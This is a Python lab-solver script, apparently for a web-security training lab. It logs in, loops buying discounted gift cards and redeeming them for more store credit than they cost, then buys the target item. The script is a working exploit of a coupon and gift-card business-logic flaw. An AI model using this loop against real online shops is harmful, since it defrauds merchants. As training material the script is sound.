import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.email_client = None
        self.gift_cards = []
        self.proxies = {'http': '127.0.0.1', 'https': '127.0.0.1:8080'}

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def send_gift_card_to_cart(self, quantity):
        data = {
            'productId': 2,
            'redir': 'PRODUCT',
            'quantity': quantity
        }
        self.session.post(self.lab_url + 'cart', data=data)

    def apply_coupon(self):
        data = {
            'csrf': self.get_csrf_token('cart'),
            'coupon': 'SIGNUP30'
        }
        self.session.post(self.lab_url + 'cart/coupon', data=data)

    def buy_gift_card(self, quantity):
        data = {
            'csrf': self.get_csrf_token('cart')
        }
        response = self.session.post(self.lab_url + 'cart/checkout', data=data)
        self.gift_cards = re.findall(r'<td>(.*)</td>', response.text)[2:2+quantity]

    def apply_gift_card(self):
        for gift_card in self.gift_cards:
            data = {
                'csrf': self.get_csrf_token('my-account'),
                'gift-card': gift_card
            }
            self.session.post(self.lab_url + 'gift-card', data=data)
        return float(re.findall(r'Store credit: \$(.*?)<', self.session.get(self.lab_url + 'my-account').text)[0])

    def increase_my_money(self):
        quantity = 10
        while True:
            self.send_gift_card_to_cart(quantity)
            self.apply_coupon()
            self.buy_gift_card(quantity)
            total = self.apply_gift_card()
            new_quantity = int(total/10.0)
            quantity = new_quantity if new_quantity > quantity else quantity
            print(quantity)
            if total >= 936.0:
                print(total)
                break
            else:
                print(total)

    def buy_target_product(self):
        data = {
            'productId': 1,
            'redir': 'PRODUCT',
            'quantity': 1
        }
        self.session.post(self.lab_url + 'cart', data=data)

        data = {
            'csrf': self.get_csrf_token('cart'),
            'coupon': 'SIGNUP30'
        }
        self.session.post(self.lab_url + 'cart/coupon', data=data)

        data = {
            'csrf': self.get_csrf_token('cart')
        }
        self.session.post(self.lab_url + 'cart/checkout', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.increase_my_money()
        self.buy_target_product()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
